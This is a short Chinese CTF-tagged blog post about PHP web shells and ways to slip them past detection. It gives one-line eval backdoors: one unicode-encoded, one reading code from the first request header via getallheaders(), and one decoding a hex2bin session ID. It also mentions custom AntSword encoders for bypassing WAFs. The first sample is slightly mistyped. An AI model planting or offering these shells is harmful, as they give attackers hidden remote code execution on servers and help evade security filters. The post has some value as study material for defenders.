---
title: GetShell
date: 2020-10-09 20:13:07
tags: CTF
---

# GetShell 常用免杀大法

## 一、编码大法

(1).一句话马子本身采用编码

```
原文：<?php @eval($_GET(a)):?>
转码后：在提交的post的时候可以直接使用\u0026\u006c\u0074\u003b\u003f\u0070\u0068\u0070\u0020\u0040\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0047\u0045\u0054\u0028\u0061\u0029\u0029\u003a\u003f\u0026\u0067\u0074\u003b
```

(2)，蚁剑链接时编码

蚁剑在getshell的时候，可以选取使用编码器和解码器，这个时候可以使用自己的独家编码器进行实际的操作，并进行花式绕过waf。蚁剑的编码器是采用的js语言进行编写的，简易操作。



## 二、花招大法

(1).通过getallheaders()来获取shell

```
<?php 
	echo 1;
	print(pos(getallheaders()));
	eval(pos(getallheaders()));
	?>
```

![](https://i.loli.net/2020/10/11/XsqMTPCSbgWezav.png)

这样配置，密码是1；

(2)同理可以使用sessionid来操作，同时搭配编码器，这就很舒服了。

```
<?php eval(hex2bin(session_id(session_start())));?>
```

这里的hex2bin可以改为base64

